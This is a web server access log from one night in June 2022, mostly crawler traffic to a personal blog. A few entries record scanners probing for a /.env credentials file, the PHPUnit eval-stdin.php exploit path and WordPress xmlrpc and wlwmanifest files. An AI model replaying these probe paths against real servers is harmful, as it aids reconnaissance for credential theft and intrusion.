185.191.171.38 - - [20/Jun/2022:00:00:41 +0000] "GET /node/939/img_6384 HTTP/1.1" 302 154 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.3 - - [20/Jun/2022:00:00:44 +0000] "GET /node/939/img_6384 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.33 - - [20/Jun/2022:00:00:47 +0000] "GET /node/939/img_6384/ HTTP/1.1" 200 7886 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
66.249.79.245 - - [20/Jun/2022:00:01:10 +0000] "GET /node/date/2007/12/ HTTP/1.1" 200 11710 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.71.25 - - [20/Jun/2022:00:01:14 +0000] "GET /wp-includes/css/dist/block-library/style.min.css?ver=5.7.1 HTTP/1.1" 200 58171 "https://static.mrchoke.org/node/date/2007/12/" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
23.88.63.223 - - [20/Jun/2022:00:02:32 +0000] "GET /.env HTTP/1.1" 404 134 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
23.88.63.223 - - [20/Jun/2022:00:02:32 +0000] "POST / HTTP/1.1" 405 166 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
23.88.63.223 - - [20/Jun/2022:00:02:33 +0000] "GET /.env HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
23.88.63.223 - - [20/Jun/2022:00:02:33 +0000] "POST / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
23.88.63.223 - - [20/Jun/2022:00:02:35 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 134 "-" "python-requests/2.28.0"
114.119.147.73 - - [20/Jun/2022:00:03:25 +0000] "GET /node/363?ak_action=accept_mobile HTTP/1.1" 302 154 "https://mrchoke.org/node/363?ak_action=reject_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.73 - - [20/Jun/2022:00:03:26 +0000] "GET /node/363?ak_action=accept_mobile HTTP/1.1" 301 178 "https://mrchoke.org/node/363?ak_action=reject_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.73 - - [20/Jun/2022:00:03:27 +0000] "GET /node/363/?ak_action=accept_mobile HTTP/1.1" 200 9853 "https://mrchoke.org/node/363?ak_action=reject_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
51.222.253.19 - - [20/Jun/2022:00:04:46 +0000] "GET /ch7_3621/ HTTP/2.0" 200 7869 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
185.191.171.40 - - [20/Jun/2022:00:05:18 +0000] "GET /node/1558/img_7504 HTTP/1.1" 302 154 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.13 - - [20/Jun/2022:00:05:19 +0000] "GET /node/1558/img_7504 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.6 - - [20/Jun/2022:00:05:21 +0000] "GET /node/1558/img_7504/ HTTP/1.1" 200 7916 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.12 - - [20/Jun/2022:00:07:28 +0000] "GET /robots.txt HTTP/1.1" 404 134 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.11 - - [20/Jun/2022:00:07:30 +0000] "GET /node/date/2006/03 HTTP/1.1" 302 154 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.34 - - [20/Jun/2022:00:07:31 +0000] "GET /robots.txt HTTP/1.1" 404 134 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.11 - - [20/Jun/2022:00:07:36 +0000] "GET /node/date/2006/03 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.15 - - [20/Jun/2022:00:07:39 +0000] "GET /node/date/2006/03/ HTTP/1.1" 200 10757 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.12 - - [20/Jun/2022:00:09:03 +0000] "GET /node/191 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.14 - - [20/Jun/2022:00:09:06 +0000] "GET /node/191/ HTTP/1.1" 200 8645 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
114.119.147.73 - - [20/Jun/2022:00:10:15 +0000] "GET /node/1607/img_7591 HTTP/1.1" 301 178 "https://mrchoke.org/node/tag/bike/page/2?ak_action=reject_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.73 - - [20/Jun/2022:00:10:20 +0000] "GET /node/1607/img_7591/ HTTP/1.1" 200 7887 "https://mrchoke.org/node/tag/bike/page/2?ak_action=reject_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.74 - - [20/Jun/2022:00:12:23 +0000] "GET /node/date/2012/04/14 HTTP/1.1" 404 134 "http://www.mrchoke.org/node/519" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
216.244.66.229 - - [20/Jun/2022:00:13:54 +0000] "GET /robots.txt HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
216.244.66.229 - - [20/Jun/2022:00:16:36 +0000] "GET /node/1356/img_7237/feed HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
51.222.253.17 - - [20/Jun/2022:00:17:12 +0000] "GET /img_6504/ HTTP/2.0" 200 7920 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
114.119.147.97 - - [20/Jun/2022:00:17:13 +0000] "GET /node/date/2005/02/28 HTTP/1.1" 302 154 "https://mrchoke.org/node/369?share=reddit" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.97 - - [20/Jun/2022:00:17:18 +0000] "GET /node/date/2005/02/28 HTTP/1.1" 301 178 "https://mrchoke.org/node/369?share=reddit" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.97 - - [20/Jun/2022:00:17:20 +0000] "GET /node/date/2005/02/28/ HTTP/1.1" 200 7896 "https://mrchoke.org/node/369?share=reddit" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
202.102.144.122 - - [20/Jun/2022:00:18:49 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03=#g\x13x\x8921\xE9\xB4\x00d\x9D#\xB2\xA1:\x22\x92\xE0>\xB6:\x18\xFD\x9D\xDD\x85<\xF9-\xE5\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 166 "-" "-"
114.119.147.73 - - [20/Jun/2022:00:19:41 +0000] "GET /node/112?share=linkedin HTTP/1.1" 302 154 "https://mrchoke.org/node/112" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.73 - - [20/Jun/2022:00:19:46 +0000] "GET /node/112?share=linkedin HTTP/1.1" 301 178 "https://mrchoke.org/node/112" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.73 - - [20/Jun/2022:00:19:49 +0000] "GET /node/112/?share=linkedin HTTP/1.1" 200 8748 "https://mrchoke.org/node/112" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.87 - - [20/Jun/2022:00:21:40 +0000] "GET /node/16?share=reddit HTTP/1.1" 302 154 "https://mrchoke.org/node/16" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.87 - - [20/Jun/2022:00:21:48 +0000] "GET /node/16?share=reddit HTTP/1.1" 301 178 "https://mrchoke.org/node/16" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.87 - - [20/Jun/2022:00:21:55 +0000] "GET /node/16/?share=reddit HTTP/1.1" 200 8435 "https://mrchoke.org/node/16" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
185.191.171.45 - - [20/Jun/2022:00:23:05 +0000] "GET /ch7_3328 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.42 - - [20/Jun/2022:00:23:07 +0000] "GET /ch7_3328/ HTTP/1.1" 200 7883 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
40.77.167.83 - - [20/Jun/2022:00:23:12 +0000] "GET /node/category/mac HTTP/2.0" 302 154 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.83 - - [20/Jun/2022:00:23:23 +0000] "GET /node/category/mac HTTP/2.0" 301 178 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
114.119.147.81 - - [20/Jun/2022:00:23:57 +0000] "GET /node/category/mobile?ak_action=reject_mobile HTTP/1.1" 302 154 "https://mrchoke.org/node/category/mobile?ak_action=accept_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.81 - - [20/Jun/2022:00:24:09 +0000] "GET /node/category/mobile?ak_action=reject_mobile HTTP/1.1" 301 178 "https://mrchoke.org/node/category/mobile?ak_action=accept_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.81 - - [20/Jun/2022:00:24:19 +0000] "GET /node/category/mobile/?ak_action=reject_mobile HTTP/1.1" 200 9342 "https://mrchoke.org/node/category/mobile?ak_action=accept_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
223.204.255.137 - - [20/Jun/2022:00:24:22 +0000] "GET /apple-touch-icon-precomposed.png HTTP/2.0" 404 123 "-" "com.apple.WebKit.Networking/8614.1.14.0.14 CFNetwork/1378.1 Darwin/22.0.0"
223.204.255.137 - - [20/Jun/2022:00:24:22 +0000] "GET /apple-touch-icon.png HTTP/2.0" 404 123 "-" "com.apple.WebKit.Networking/8614.1.14.0.14 CFNetwork/1378.1 Darwin/22.0.0"
223.204.255.137 - - [20/Jun/2022:00:24:22 +0000] "GET /favicon.ico HTTP/2.0" 200 1150 "-" "com.apple.WebKit.Networking/8614.1.14.0.14 CFNetwork/1378.1 Darwin/22.0.0"
223.204.255.137 - - [20/Jun/2022:00:24:22 +0000] "GET /apple-touch-icon-precomposed.png HTTP/2.0" 404 123 "-" "com.apple.WebKit.Networking/8614.1.14.0.14 CFNetwork/1378.1 Darwin/22.0.0"
223.204.255.137 - - [20/Jun/2022:00:24:22 +0000] "GET /apple-touch-icon.png HTTP/2.0" 404 123 "-" "com.apple.WebKit.Networking/8614.1.14.0.14 CFNetwork/1378.1 Darwin/22.0.0"
223.204.255.137 - - [20/Jun/2022:00:24:22 +0000] "GET /favicon.ico HTTP/2.0" 200 1150 "-" "com.apple.WebKit.Networking/8614.1.14.0.14 CFNetwork/1378.1 Darwin/22.0.0"
223.204.255.137 - - [20/Jun/2022:00:24:22 +0000] "GET /apple-touch-icon-precomposed.png HTTP/2.0" 404 123 "-" "com.apple.WebKit.Networking/8614.1.14.0.14 CFNetwork/1378.1 Darwin/22.0.0"
223.204.255.137 - - [20/Jun/2022:00:24:22 +0000] "GET /apple-touch-icon.png HTTP/2.0" 404 123 "-" "com.apple.WebKit.Networking/8614.1.14.0.14 CFNetwork/1378.1 Darwin/22.0.0"
223.204.255.137 - - [20/Jun/2022:00:24:22 +0000] "GET /favicon.ico HTTP/2.0" 200 1150 "-" "com.apple.WebKit.Networking/8614.1.14.0.14 CFNetwork/1378.1 Darwin/22.0.0"
223.204.255.137 - - [20/Jun/2022:00:24:22 +0000] "GET / HTTP/2.0" 200 282 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.4 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.4 facebookexternalhit/1.1 Facebot Twitterbot/1.0"
223.204.255.137 - - [20/Jun/2022:00:24:22 +0000] "GET / HTTP/2.0" 200 282 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.4 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.4 facebookexternalhit/1.1 Facebot Twitterbot/1.0"
223.204.255.137 - - [20/Jun/2022:00:24:22 +0000] "GET / HTTP/2.0" 200 282 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.4 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.4 facebookexternalhit/1.1 Facebot Twitterbot/1.0"
223.204.255.137 - - [20/Jun/2022:00:24:22 +0000] "GET / HTTP/2.0" 200 282 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.4 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.4 facebookexternalhit/1.1 Facebot Twitterbot/1.0"
223.204.255.137 - - [20/Jun/2022:00:24:22 +0000] "GET /apple-touch-icon-precomposed.png HTTP/2.0" 404 123 "-" "com.apple.WebKit.Networking/8614.1.14.0.14 CFNetwork/1378.1 Darwin/22.0.0"
223.204.255.137 - - [20/Jun/2022:00:24:22 +0000] "GET /apple-touch-icon.png HTTP/2.0" 404 123 "-" "com.apple.WebKit.Networking/8614.1.14.0.14 CFNetwork/1378.1 Darwin/22.0.0"
223.204.255.137 - - [20/Jun/2022:00:24:22 +0000] "GET /favicon.ico HTTP/2.0" 200 1150 "-" "com.apple.WebKit.Networking/8614.1.14.0.14 CFNetwork/1378.1 Darwin/22.0.0"
223.204.255.137 - - [20/Jun/2022:00:24:22 +0000] "GET /apple-touch-icon-precomposed.png HTTP/2.0" 404 123 "-" "com.apple.WebKit.Networking/8614.1.14.0.14 CFNetwork/1378.1 Darwin/22.0.0"
223.204.255.137 - - [20/Jun/2022:00:24:22 +0000] "GET /apple-touch-icon.png HTTP/2.0" 404 123 "-" "com.apple.WebKit.Networking/8614.1.14.0.14 CFNetwork/1378.1 Darwin/22.0.0"
223.204.255.137 - - [20/Jun/2022:00:24:22 +0000] "GET /favicon.ico HTTP/2.0" 200 1150 "-" "com.apple.WebKit.Networking/8614.1.14.0.14 CFNetwork/1378.1 Darwin/22.0.0"
223.204.255.137 - - [20/Jun/2022:00:24:22 +0000] "GET / HTTP/2.0" 200 282 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.4 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.4 facebookexternalhit/1.1 Facebot Twitterbot/1.0"
216.244.66.229 - - [20/Jun/2022:00:25:07 +0000] "GET /node/219 HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
216.244.66.229 - - [20/Jun/2022:00:25:14 +0000] "GET /node/344 HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
114.119.147.87 - - [20/Jun/2022:00:25:50 +0000] "GET /node/category/linux/linuxsis/ HTTP/1.1" 200 15729 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.73 - - [20/Jun/2022:00:28:01 +0000] "GET /node/date/2004/06/page/3 HTTP/1.1" 301 178 "https://static.mrchoke.org/node/date/2004/06/page/2" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.73 - - [20/Jun/2022:00:28:01 +0000] "GET /node/date/2004/06/page/3/ HTTP/1.1" 200 12329 "https://static.mrchoke.org/node/date/2004/06/page/2" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.97 - - [20/Jun/2022:00:30:04 +0000] "GET /node/186?share=twitter HTTP/1.1" 302 154 "https://mrchoke.org/node/186?ak_action=accept_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
51.222.253.14 - - [20/Jun/2022:00:30:17 +0000] "GET /node/36/ HTTP/2.0" 200 9376 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
2001:470:1:c84::12 - - [20/Jun/2022:00:30:20 +0000] "GET / HTTP/1.1" 301 178 "-" "-"
114.119.147.97 - - [20/Jun/2022:00:30:32 +0000] "GET /node/186?share=twitter HTTP/1.1" 301 178 "https://mrchoke.org/node/186?ak_action=accept_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.75 - - [20/Jun/2022:00:30:49 +0000] "GET /node/186?share=twitter HTTP/1.1" 302 154 "https://mrchoke.org/node/186?ak_action=accept_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.75 - - [20/Jun/2022:00:30:52 +0000] "GET /node/186?share=twitter HTTP/1.1" 301 178 "https://mrchoke.org/node/186?ak_action=accept_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.75 - - [20/Jun/2022:00:30:58 +0000] "GET /node/186/?share=twitter HTTP/1.1" 200 10997 "https://mrchoke.org/node/186?ak_action=accept_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.81 - - [20/Jun/2022:00:32:12 +0000] "GET /node/12 HTTP/1.1" 302 154 "https://mrchoke.org/node/13?share=reddit" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.81 - - [20/Jun/2022:00:32:18 +0000] "GET /node/12 HTTP/1.1" 301 178 "https://mrchoke.org/node/13?share=reddit" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.81 - - [20/Jun/2022:00:32:22 +0000] "GET /node/12/ HTTP/1.1" 200 8390 "https://mrchoke.org/node/13?share=reddit" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
37.0.8.76 - - [20/Jun/2022:00:33:29 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0 Safari/537.36"
37.0.8.76 - - [20/Jun/2022:00:33:30 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0 Safari/537.36"
37.0.8.76 - - [20/Jun/2022:00:33:31 +0000] "GET /wp-includes/wlwmanifest.xml HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0 Safari/537.36"
37.0.8.76 - - [20/Jun/2022:00:33:32 +0000] "GET /xmlrpc.php?rsd HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0 Safari/537.36"
37.0.8.76 - - [20/Jun/2022:00:33:33 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0 Safari/537.36"
37.0.8.76 - - [20/Jun/2022:00:33:34 +0000] "GET /blog/wp-includes/wlwmanifest.xml HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0 Safari/537.36"
37.0.8.76 - - [20/Jun/2022:00:33:34 +0000] "GET /web/wp-includes/wlwmanifest.xml HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0 Safari/537.36"
37.0.8.76 - - [20/Jun/2022:00:33:35 +0000] "GET /wordpress/wp-includes/wlwmanifest.xml HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0 Safari/537.36"
37.0.8.76 - - [20/Jun/2022:00:33:36 +0000] "GET /website/wp-includes/wlwmanifest.xml HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0 Safari/537.36"
37.0.8.76 - - [20/Jun/2022:00:33:37 +0000] "GET /wp/wp-includes/wlwmanifest.xml HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0 Safari/537.36"
37.0.8.76 - - [20/Jun/2022:00:33:37 +0000] "GET /news/wp-includes/wlwmanifest.xml HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0 Safari/537.36"
37.0.8.76 - - [20/Jun/2022:00:33:38 +0000] "GET /wp1/wp-includes/wlwmanifest.xml HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0 Safari/537.36"
37.0.8.76 - - [20/Jun/2022:00:33:39 +0000] "GET /test/wp-includes/wlwmanifest.xml HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0 Safari/537.36"
37.0.8.76 - - [20/Jun/2022:00:33:40 +0000] "GET /wp2/wp-includes/wlwmanifest.xml HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0 Safari/537.36"
37.0.8.76 - - [20/Jun/2022:00:33:40 +0000] "GET /site/wp-includes/wlwmanifest.xml HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0 Safari/537.36"
37.0.8.76 - - [20/Jun/2022:00:33:41 +0000] "GET /cms/wp-includes/wlwmanifest.xml HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0 Safari/537.36"
37.0.8.76 - - [20/Jun/2022:00:33:42 +0000] "GET /sito/wp-includes/wlwmanifest.xml HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0 Safari/537.36"
37.0.8.76 - - [20/Jun/2022:00:33:42 +0000] "" 400 0 "-" "-"
114.119.147.81 - - [20/Jun/2022:00:34:21 +0000] "GET /node/30 HTTP/1.1" 301 178 "https://mrchoke.org/node/category/xorg/page/2?ak_action=reject_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.81 - - [20/Jun/2022:00:34:26 +0000] "GET /node/30/ HTTP/1.1" 200 10386 "https://mrchoke.org/node/category/xorg/page/2?ak_action=reject_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
185.191.171.2 - - [20/Jun/2022:00:35:36 +0000] "GET /node/tag/%E0%B8%A3%E0%B8%96%E0%B9%84%E0%B8%9F HTTP/1.1" 404 134 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.36 - - [20/Jun/2022:00:37:27 +0000] "GET /node/1839 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.17 - - [20/Jun/2022:00:37:29 +0000] "GET /node/1839/ HTTP/1.1" 200 12577 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
114.119.147.81 - - [20/Jun/2022:00:40:41 +0000] "GET /node/472?share=facebook HTTP/1.1" 302 154 "https://mrchoke.org/node/472?ak_action=reject_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
